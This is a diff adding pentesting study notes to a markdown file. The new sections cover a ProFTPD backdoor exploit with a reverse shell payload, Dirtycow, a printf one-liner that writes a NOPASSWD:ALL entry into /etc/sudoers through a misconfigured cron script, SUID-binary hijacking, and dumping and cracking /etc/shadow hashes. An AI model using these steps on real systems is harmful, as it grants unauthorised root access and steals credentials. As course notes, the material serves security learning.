@@ -209,6 +209,10 @@ Steps:
   - `dir` to list file and dir
   - `get <file>` to download file
 
+**Other exploit:**
+- Use module exploit `proftpd_133c_backdoor`
+  - `set payload payload/cmd/unix/reverse`, also set `lhost` and `rhosts`
+
 ### SSH
 
 We can use hydra to exploit ssh
@@ -232,3 +236,63 @@ A linux implementation of SMB, allow Windows system access linux file system.
 Other tools
 - `enum4linux -a <target>` list shares and check anonymous
   - Have other enum options, but need to provide user and password
+
+## Linux kernel
+
+Kernel in linux is different between distro and version
+
+Tools: [Linux exploit suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)
+
+Scenerio: 
+- Have meterpreter session -> `sysinfo` Show some info oe `getuid`
+- The user we get usually don't have much of privilege
+- Download the `les.sh`, upload to the target, and run it
+
+### Dirtycow
+
+[EDB Dirtycow](https://www.exploit-db.com/exploits/40839)
+
+- Download the code 
+- Upload to target
+- Complie it and chmod +x
+- Run it -> Login with new user
+
+### Exploit misconfig Cronjob
+Cron is a time-based service that run applications, scripts and other commands repeatedly on specified schedule
+- Crontab file is a configuration file for cronjob
+- Cronjob can be run by any user
+- If shell script or crontab is misconfig the permission, we can exploit it to run unwanted task or command with escalated privilege
+
+Technique
+
+- Use `crontab -l` to list cronjob
+- Example we have a file call `root_exe` with higher privileage of current user
+- We can use `grep -rnw /usr -e "/path/to/root_exe"` to find any script contains the path of file
+- Check if we can exploit the script
+  - Ex: `printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /path/to/script`
+  - Recheck with `sudo -l`
+  - Login all user with no password
+
+### SUID Binaries
+
+[Wiki ref](https://en.wikipedia.org/wiki/Setuid)
+
+- We have other set of privilege on linux call SUID (Set Owner User ID).
+- When applied, this permission allow user with ability to execute file or binary with permission of the file owner. (ex: `sudo` command)
+- When exploit, we looking for file that own by privilege user and have execute permission (file must have USID though)
+  - Take a look at permission string `-rwsr-xr-x`, it have `s` permission -> it have USID and other user can run this run.
+  - Infor of file `file <filePath>` `strings <filePath>`
+  - If the file target to run other file, we can change the target file to `/bin/bash`
+  - So when the file run, it will run `/bin/bash` with escalated privilege
+
+### Linux Hash
+
+- All information about account is store in `/etc/passwd`
+- Hash info is store in `/etc/shadow`
+- The hash password has a format, we can know the hash algorithm by looking the number with $ sign that after the username
+  - 1 ~ MD5, 2 ~ Blowfish, 5 ~ SHA256, 6 ~ SHA512
+- We can use post module `gather/hashdump` -> Set sessions and run
+  - It will output the crackable format file
+- After `hashdump` module, we can use `auxiliary/analyze/crack_linux`
+  - Set hash algorithm to true, ex `sha512 true`
+  - Run -> It may or may not able to crack the password, we can change the crack engine.
